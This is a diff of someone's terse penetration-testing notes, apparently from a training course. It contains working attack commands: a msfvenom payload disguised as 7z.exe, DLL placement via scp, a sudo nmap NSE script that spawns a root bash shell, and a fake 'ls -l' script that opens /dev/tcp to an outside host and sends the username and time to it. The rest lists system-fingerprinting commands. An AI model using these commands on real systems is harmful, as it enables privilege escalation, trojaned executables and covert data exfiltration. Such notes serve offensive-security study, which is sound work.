@@ -330,6 +330,27 @@ Moving DLL: scp SPICLI.dll <tgt IP>:"<Tgt Directory; Abs Path>
 Maliious executable: msfvenom -p windows\exec CMD='cmd.exe /C "ifconfig" > C:\Users\Student\Desktop\ifconfig.txt -f exe' > 7z.exe
 Moving executable: just scp it 
 
+Lin Exploit
+###
+echo 'os.execute ("/bin/bash")' > /tmp/escape.nse
+chmod +x /tmp/escape.nse
+sudo nmap --script=/tmp/escape.nse
+###
+###
+echo "exec 3<>/dev/tcp/192.168.1.40/4444" > /tmp/ls-l
+echo "echo \$(whoami) logged in on \$(date) >&3" >> /tmp/ls-l
+chmod +x /tmp/ls-l
+###
+### FInd what type of system you're on (all diff cmds)
+ls -latr /proc/1/exe
+stat /sbin/init
+man init
+init --version
+ps 1
+###
+
+
+
 
 
            ASD
